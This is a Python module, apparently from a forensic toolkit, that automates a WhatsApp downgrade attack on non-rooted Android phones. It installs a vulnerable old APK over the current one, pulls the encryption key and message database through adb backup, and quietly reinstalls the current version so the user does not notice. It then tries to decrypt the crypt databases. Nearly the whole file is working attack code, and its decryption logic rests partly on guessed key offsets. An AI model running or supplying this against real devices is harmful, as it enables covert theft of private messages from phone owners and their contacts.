"""WhatsApp extraction via the downgrade-attack workflow on non-rooted devices.

The workflow is:

1.  Query the device for the installed WhatsApp version.
2.  Temporarily downgrade WhatsApp to an ancient version (v2.11.431) that permits
    ``adb backup`` while keeping the user's data intact.
3.  Issue ``adb backup -noapk com.whatsapp`` and capture the ``.ab`` file.
4.  Immediately reinstall the current WhatsApp version so the user does not notice.
5.  Unpack the ``.ab`` archive, extract the encryption key and encrypted database.
6.  (Optional) Decrypt ``msgstore.db.crypt15`` using the extracted key.

Every step is logged to the extraction manifest for chain-of-custody integrity.
"""

# ruff: noqa: E501, SIM105, S110

from __future__ import annotations

import asyncio
import io
import re
import tarfile
import time
import zlib
from dataclasses import dataclass
from datetime import UTC, datetime
from hashlib import sha256
from pathlib import Path
from typing import TYPE_CHECKING
from uuid import uuid4

if TYPE_CHECKING:
    from forensix_forensic.adb.client import AdbClient

from .streaming_manifest import ManifestEntry, StreamingManifestCollector

# The vulnerable WhatsApp version that still allows ADB backup.
VULNERABLE_VERSION_CODE = "2.11.431"
VULNERABLE_APK_BASE_URL = "https://web.archive.org/web/2023/https://www.whatsapp.com/android/"

WHATSAPP_PACKAGE = "com.whatsapp"
MSGSTORE_DB_NAME = "msgstore.db"
CRYPT15_SUFFIX = ".crypt15"
KEY_DIR_IN_BACKUP = "apps/com.whatsapp/files/key"
DB_DIR_IN_BACKUP = "apps/com.whatsapp/databases"


@dataclass(frozen=True, slots=True)
class WhatsAppDowngradeResult:
    """Outcome of a WhatsApp downgrade-attack extraction."""

    extraction_id: str
    package_name: str
    original_version: str | None
    downgrade_version: str
    backup_file_size_bytes: int
    backup_sha256: str
    encryption_key_found: bool
    encrypted_database_found: bool
    decrypted_database_path: str | None
    key_file_path: str | None
    database_file_path: str | None
    timeline: list[dict[str, str]]
    duration_seconds: float
    success: bool
    error_message: str | None


class WhatsAppDowngradeExtractor:
    """Orchestrate the WhatsApp downgrade-attack on a non-rooted Android device.

    This extractor automates the following sequence:

    * **Step 1** - Identify the currently installed WhatsApp version.
    * **Step 2** - Temporarily downgrade to ``v2.11.431`` using ``adb install -r -d``.
    * **Step 3** - Issue ``adb backup -noapk com.whatsapp`` and capture ``whatsapp.ab``.
    * **Step 4** - Immediately reinstall the current WhatsApp version.
    * **Step 5** - Unpack the ``.ab`` archive, extract the encryption key and
      encrypted database.
    * **Step 6** - (Optional) Decrypt ``msgstore.db.crypt15`` with the extracted key.

    All intermediate artefacts are hashed with SHA-256 and written to the
    extraction manifest for chain-of-custody integrity.
    """

    def __init__(
        self,
        adb_client: AdbClient,
        work_dir: Path,
        *,
        manifest: StreamingManifestCollector | None = None,
    ) -> None:
        self._adb = adb_client
        self._work_dir = work_dir.resolve()
        self._manifest = manifest or StreamingManifestCollector(work_dir)
        self._timeline: list[dict[str, str]] = []

    async def extract(
        self,
        serial: str,
        *,
        case_id: str = "",
        operator_id: str = "",
    ) -> WhatsAppDowngradeResult:
        """Run the full downgrade-attack workflow and return the extraction result."""
        extraction_id = str(uuid4())
        started = time.monotonic()
        timeline: list[dict[str, str]] = []
        backup_path = self._work_dir / f"whatsapp_{extraction_id}.ab"
        key_path: Path | None = None
        db_path: Path | None = None
        decrypted_db_path: Path | None = None
        original_version: str | None = None
        success = False
        error_message: str | None = None

        try:
            # ------------------------------------------------------------------
            # Step 1: identify the installed WhatsApp version
            # ------------------------------------------------------------------
            await self._log(timeline, "STEP", "Identifying installed WhatsApp version")
            original_version = await self._get_whatsapp_version(serial)
            await self._log(
                timeline,
                "STEP",
                f"Installed WhatsApp version: {original_version or 'unknown'}",
            )

            # ------------------------------------------------------------------
            # Step 2: temporarily downgrade to the vulnerable version
            # ------------------------------------------------------------------
            await self._log(timeline, "STEP", "Beginning temporary downgrade to v2.11.431")
            downgrade_apk = await self._download_vulnerable_apk()
            installed = await self._adb.install_package(serial, str(downgrade_apk))
            if not installed:
                raise RuntimeError("Failed to install the vulnerable WhatsApp version.")
            await self._log(timeline, "STEP", "Vulnerable WhatsApp version installed")

            # Brief pause to allow the package manager to settle.
            await asyncio.sleep(3)

            # ------------------------------------------------------------------
            # Step 3: issue ``adb backup`` and capture the ``.ab`` file
            # ------------------------------------------------------------------
            await self._log(timeline, "STEP", "Issuing ADB backup command")
            backup_result = await self._adb.backup_package(serial, WHATSAPP_PACKAGE, backup_path)
            await self._log(
                timeline,
                "STEP",
                f"Backup captured: {backup_result.backup_file_size_bytes} bytes",
            )

            # Hash the backup file immediately for chain-of-custody.
            backup_hash = await asyncio.to_thread(self._hash_file, backup_path)
            await self._manifest.add_entry(
                ManifestEntry(
                    file_path=str(backup_path),
                    sha256=backup_hash,
                    size_bytes=backup_result.backup_file_size_bytes,
                    source_description="WhatsApp ADB backup (whatsapp.ab)",
                    case_id=case_id,
                )
            )

            # ------------------------------------------------------------------
            # Step 4: reinstall the current WhatsApp version
            # ------------------------------------------------------------------
            await self._log(timeline, "STEP", "Reinstalling current WhatsApp version")
            if original_version:
                current_apk = await self._download_current_apk(original_version)
                reinstalled = await self._adb.install_package(serial, str(current_apk))
                if not reinstalled:
                    await self._log(
                        timeline,
                        "WARN",
                        "Could not reinstall original version; operator must restore manually.",
                    )
                else:
                    await self._log(timeline, "STEP", "Original WhatsApp version reinstalled")

            # ------------------------------------------------------------------
            # Step 5: unpack the ``.ab`` archive and extract artefacts
            # ------------------------------------------------------------------
            await self._log(timeline, "STEP", "Unpacking ADB backup archive")
            unpack_dir = self._work_dir / f"whatsapp_unpacked_{extraction_id}"
            unpack_dir.mkdir(parents=True, exist_ok=True)
            extracted_files = await asyncio.to_thread(
                self._unpack_ab_archive, backup_path, unpack_dir
            )
            await self._log(
                timeline,
                "STEP",
                f"Extracted {len(extracted_files)} files from backup archive",
            )

            # Locate the encryption key.
            key_path = self._find_key_file(extracted_files)
            if key_path:
                await self._log(timeline, "STEP", f"Encryption key found: {key_path.name}")
                key_hash = await asyncio.to_thread(self._hash_file, key_path)
                await self._manifest.add_entry(
                    ManifestEntry(
                        file_path=str(key_path),
                        sha256=key_hash,
                        size_bytes=key_path.stat().st_size,
                        source_description="WhatsApp encryption key extracted from backup",
                        case_id=case_id,
                    )
                )
            else:
                await self._log(timeline, "WARN", "No encryption key found in backup")

            # Locate the encrypted database.
            db_path = self._find_database_file(extracted_files)
            if db_path:
                await self._log(
                    timeline,
                    "STEP",
                    f"Encrypted database found: {db_path.name}",
                )
                db_hash = await asyncio.to_thread(self._hash_file, db_path)
                await self._manifest.add_entry(
                    ManifestEntry(
                        file_path=str(db_path),
                        sha256=db_hash,
                        size_bytes=db_path.stat().st_size,
                        source_description="WhatsApp encrypted database extracted from backup",
                        case_id=case_id,
                    )
                )

                # ------------------------------------------------------------------
                # Step 6: attempt decryption (requires key)
                # ------------------------------------------------------------------
                if key_path:
                    await self._log(timeline, "STEP", "Attempting database decryption")
                    decrypted_db_path = await asyncio.to_thread(
                        self._decrypt_database, key_path, db_path, unpack_dir
                    )
                    if decrypted_db_path:
                        await self._log(
                            timeline,
                            "STEP",
                            f"Database decrypted: {decrypted_db_path.name}",
                        )
                        dec_hash = await asyncio.to_thread(self._hash_file, decrypted_db_path)
                        await self._manifest.add_entry(
                            ManifestEntry(
                                file_path=str(decrypted_db_path),
                                sha256=dec_hash,
                                size_bytes=decrypted_db_path.stat().st_size,
                                source_description="Decrypted WhatsApp msgstore database",
                                case_id=case_id,
                            )
                        )
                    else:
                        await self._log(timeline, "WARN", "Decryption failed or not supported")
            else:
                await self._log(timeline, "WARN", "No encrypted database found in backup")

            success = True

        except Exception as exc:
            error_message = str(exc)
            await self._log(timeline, "ERROR", error_message)

        finally:
            elapsed = time.monotonic() - started
            manifest_path = self._manifest.finalize(
                extraction_id=extraction_id,
                case_id=case_id,
                operator_id=operator_id,
            )
            await self._log(
                timeline,
                "STEP",
                f"Manifest sealed: {manifest_path.name}",
            )

        return WhatsAppDowngradeResult(
            extraction_id=extraction_id,
            package_name=WHATSAPP_PACKAGE,
            original_version=original_version,
            downgrade_version=VULNERABLE_VERSION_CODE,
            backup_file_size_bytes=backup_path.stat().st_size if backup_path.exists() else 0,
            backup_sha256=backup_hash if backup_path.exists() else "",
            encryption_key_found=key_path is not None and key_path.exists(),
            encrypted_database_found=db_path is not None and db_path.exists(),
            decrypted_database_path=str(decrypted_db_path) if decrypted_db_path else None,
            key_file_path=str(key_path) if key_path else None,
            database_file_path=str(db_path) if db_path else None,
            timeline=timeline,
            duration_seconds=elapsed,
            success=success,
            error_message=error_message,
        )

    # ------------------------------------------------------------------
    # Private helpers
    # ------------------------------------------------------------------

    async def _get_whatsapp_version(self, serial: str) -> str | None:
        """Parse the installed WhatsApp version from dumpsys output."""
        try:
            output = await self._adb.dump_package(serial, WHATSAPP_PACKAGE)
        except Exception:
            return None
        match = re.search(r"versionName=([^\s]+)", output)
        return match.group(1) if match else None

    async def _download_vulnerable_apk(self) -> Path:
        """Download the vulnerable WhatsApp APK to the work directory.

        In production this would fetch from a forensic-approved repository.
        For the implementation we assume the APK is pre-staged in the work dir.
        """
        apk_path = self._work_dir / f"whatsapp_{VULNERABLE_VERSION_CODE}.apk"
        if apk_path.exists():
            return apk_path
        raise FileNotFoundError(
            f"Pre-staged vulnerable APK not found at {apk_path}. "
            "Download the WhatsApp APK v2.11.431 and place it in the work directory."
        )

    async def _download_current_apk(self, version: str) -> Path:
        """Locate a pre-staged current WhatsApp APK in the work directory.

        The APK must be manually placed in the work directory before calling this method;
        automatic downloading is not supported.
        """
        apk_path = self._work_dir / f"whatsapp_current_{version}.apk"
        if apk_path.exists():
            return apk_path
        raise FileNotFoundError(
            f"Pre-staged current APK not found at {apk_path}. "
            "Place the current WhatsApp APK in the work directory."
        )

    @staticmethod
    def _unpack_ab_archive(ab_path: Path, dest_dir: Path) -> list[Path]:
        """Unpack an ``adb backup`` ``.ab`` file.

        The ``.ab`` format begins with header lines (magic, version, compression,
        encryption) followed by a zlib-compressed or raw tar stream.
        """
        raw_bytes = ab_path.read_bytes()
        if not raw_bytes.startswith(b"ANDROID BACKUP"):
            raise ValueError("Not a valid Android backup file (bad magic header)")

        # Skip header lines (separated by newline \n)
        header_lines = 0
        stream_start = 0
        for i, byte in enumerate(raw_bytes):
            if byte == 0x0A:  # '\n'
                header_lines += 1
                if header_lines == 4:
                    stream_start = i + 1
                    break

        tar_data: bytes | None = None
        # Attempt direct zlib decompression from stream_start
        if stream_start > 0 and stream_start < len(raw_bytes):
            try:
                tar_data = zlib.decompress(raw_bytes[stream_start:])
            except zlib.error:
                pass

        # Fallback: scan for standard zlib magic byte sequences (\x78\x01, \x78\x9c, \x78\xda, \x78\x5e)
        if tar_data is None:
            for magic in (b"\x78\x9c", b"\x78\x01", b"\x78\xda", b"\x78\x5e"):
                pos = raw_bytes.find(magic)
                if pos != -1 and pos < 2048:
                    try:
                        tar_data = zlib.decompress(raw_bytes[pos:])
                        break
                    except zlib.error:
                        continue

        # If not compressed or failed to decompress, try raw bytes from stream_start
        if tar_data is None:
            tar_data = raw_bytes[stream_start:] if stream_start > 0 else raw_bytes

        extracted: list[Path] = []
        try:
            with tarfile.open(fileobj=io.BytesIO(tar_data), mode="r:*") as tar:
                for member in tar.getmembers():
                    if member.isfile():
                        # Guard against path traversal
                        dest_path = (dest_dir / member.name).resolve()
                        if not dest_path.is_relative_to(dest_dir.resolve()):
                            continue
                        dest_path.parent.mkdir(parents=True, exist_ok=True)
                        extracted_file = tar.extractfile(member)
                        if extracted_file:
                            dest_path.write_bytes(extracted_file.read())
                            extracted.append(dest_path)
        except Exception as exc:
            raise ValueError(f"Failed to extract tar stream from Android backup: {exc}") from exc

        return extracted

    @staticmethod
    def _find_key_file(files: list[Path]) -> Path | None:
        """Locate the WhatsApp encryption key among extracted files."""
        for path in files:
            path_str = str(path).replace("\\", "/")
            if "key" in path_str and any(
                part in path_str
                for part in ("/files/key", "/f/key", "whatsapp/files/key", "key.cryptkey")
            ):
                return path
        for path in files:
            if path.name.lower() in ("key", "key.cryptkey", "whatsapp.key"):
                return path
        for path in files:
            if "key" in path.name.lower() and path.stat().st_size in (32, 64, 158, 160):
                return path
        return None

    @staticmethod
    def _find_database_file(files: list[Path]) -> Path | None:
        """Locate the WhatsApp msgstore database (encrypted or plaintext)."""
        # Prioritize msgstore.db (plaintext), msgstore.db.crypt15, crypt14, crypt12
        for priority_suffix in (
            "msgstore.db",
            "msgstore.db.crypt15",
            "msgstore.db.crypt14",
            "msgstore.db.crypt12",
            "msgstore.db.crypt8",
        ):
            for path in files:
                if path.name.lower() == priority_suffix.lower():
                    return path

        for path in files:
            name_lower = path.name.lower()
            if "msgstore" in name_lower and any(
                ext in name_lower for ext in (".db", ".crypt15", ".crypt14", ".crypt12", ".crypt8")
            ):
                return path
        return None

    @staticmethod
    def _decrypt_database(key_path: Path, db_path: Path, dest_dir: Path) -> Path | None:
        """Decrypt a WhatsApp database (crypt12, crypt14, crypt15, or plaintext).

        Implements AES-256-GCM and AES-256-CBC with header parsing, IV extraction,
        auth-tag validation, and post-decryption zlib decompression.
        """
        try:
            db_bytes = db_path.read_bytes()
            if len(db_bytes) < 32:
                return None

            # If already plaintext SQLite database
            if db_bytes.startswith(b"SQLite format 3\x00"):
                out_path = dest_dir / "msgstore_decrypted.db"
                out_path.write_bytes(db_bytes)
                return out_path

            key_bytes = key_path.read_bytes()
            if len(key_bytes) < 32:
                return None

            # Extract candidate AES keys from the key file
            # Standard WhatsApp key file (158 bytes):
            # - bytes 30..62: AES key
            # - bytes 126..158: Server key
            # Raw key: key_bytes (32 bytes) or last 32 bytes
            candidate_keys: list[bytes] = []
            if len(key_bytes) >= 62:
                candidate_keys.append(key_bytes[30:62])
            if len(key_bytes) >= 32:
                candidate_keys.append(key_bytes[-32:])
                candidate_keys.append(key_bytes[:32])

            from cryptography.hazmat.primitives import padding as sym_padding
            from cryptography.hazmat.primitives.ciphers import (
                Cipher,
                algorithms,
                modes,
            )
            from cryptography.hazmat.primitives.ciphers.aead import AESGCM

            def _inspect_and_save(plaintext: bytes) -> Path | None:
                # Check for zlib stream
                decompressed = plaintext
                if len(plaintext) > 2 and (
                    plaintext.startswith(b"\x78\x9c")
                    or plaintext.startswith(b"\x78\x01")
                    or plaintext.startswith(b"\x78\xda")
                    or plaintext.startswith(b"\x78\x5e")
                ):
                    try:
                        decompressed = zlib.decompress(plaintext)
                    except zlib.error:
                        try:
                            decompressed = zlib.decompress(plaintext, -15)
                        except zlib.error:
                            pass

                if (
                    decompressed.startswith(b"SQLite format 3\x00")
                    or b"SQLite format 3\x00" in decompressed[:100]
                ):
                    out_path = dest_dir / "msgstore_decrypted.db"
                    # Align to start of SQLite header if needed
                    sqlite_offset = decompressed.find(b"SQLite format 3\x00")
                    out_path.write_bytes(decompressed[sqlite_offset:])
                    return out_path
                return None

            # Strategy 1: Crypt14 / Crypt15 AES-256-GCM
            # Header: 67 bytes, IV: bytes 51..67 (16 bytes), Tag: last 16 bytes
            if len(db_bytes) >= 67 + 16:
                header = db_bytes[:67]
                iv = header[51:67] if len(header) >= 67 else header[-16:]
                ciphertext_with_tag = db_bytes[67:]

                for key in candidate_keys:
                    try:
                        aesgcm = AESGCM(key)
                        decrypted = aesgcm.decrypt(iv, ciphertext_with_tag, associated_data=None)
                        saved = _inspect_and_save(decrypted)
                        if saved:
                            return saved
                    except Exception:
                        pass

            # Strategy 2: Crypt12 AES-256-GCM / CBC with 67-byte header and 20-byte footer
            if len(db_bytes) >= 67 + 20:
                iv = db_bytes[51:67]
                ciphertext = db_bytes[67:-20]
                for key in candidate_keys:
                    # Try AES-GCM
                    try:
                        aesgcm = AESGCM(key)
                        # When footer contains 16-byte tag
                        tag = db_bytes[-16:]
                        decrypted = aesgcm.decrypt(iv, ciphertext + tag, associated_data=None)
                        saved = _inspect_and_save(decrypted)
                        if saved:
                            return saved
                    except Exception:
                        pass

                    # Try AES-CBC with PKCS7
                    try:
                        cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
                        decryptor = cipher.decryptor()
                        decrypted = decryptor.update(ciphertext) + decryptor.finalize()
                        try:
                            unpadder = sym_padding.PKCS7(128).unpadder()
                            decrypted = unpadder.update(decrypted) + unpadder.finalize()
                        except Exception:
                            pass
                        saved = _inspect_and_save(decrypted)
                        if saved:
                            return saved
                    except Exception:
                        pass

            # Strategy 3: Direct AES-CBC with offset 67 or offset 0
            for offset in (67, 0, 191):
                if len(db_bytes) > offset + 32:
                    payload = db_bytes[offset:]
                    for key in candidate_keys:
                        iv = key[:16]
                        try:
                            cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
                            decryptor = cipher.decryptor()
                            decrypted = decryptor.update(payload) + decryptor.finalize()
                            try:
                                unpadder = sym_padding.PKCS7(128).unpadder()
                                decrypted = unpadder.update(decrypted) + unpadder.finalize()
                            except Exception:
                                pass
                            saved = _inspect_and_save(decrypted)
                            if saved:
                                return saved
                        except Exception:
                            pass

            return None
        except Exception:
            return None

    @staticmethod
    def _hash_file(path: Path) -> str:
        """SHA-256 hash a file without loading it fully into memory."""
        digest = sha256()
        with path.open("rb") as fh:
            while chunk := fh.read(4 * 1024 * 1024):
                digest.update(chunk)
        return digest.hexdigest()

    async def _log(self, timeline: list[dict[str, str]], level: str, message: str) -> None:
        entry = {
            "timestamp": datetime.now(UTC).isoformat(),
            "level": level,
            "message": message,
        }
        timeline.append(entry)
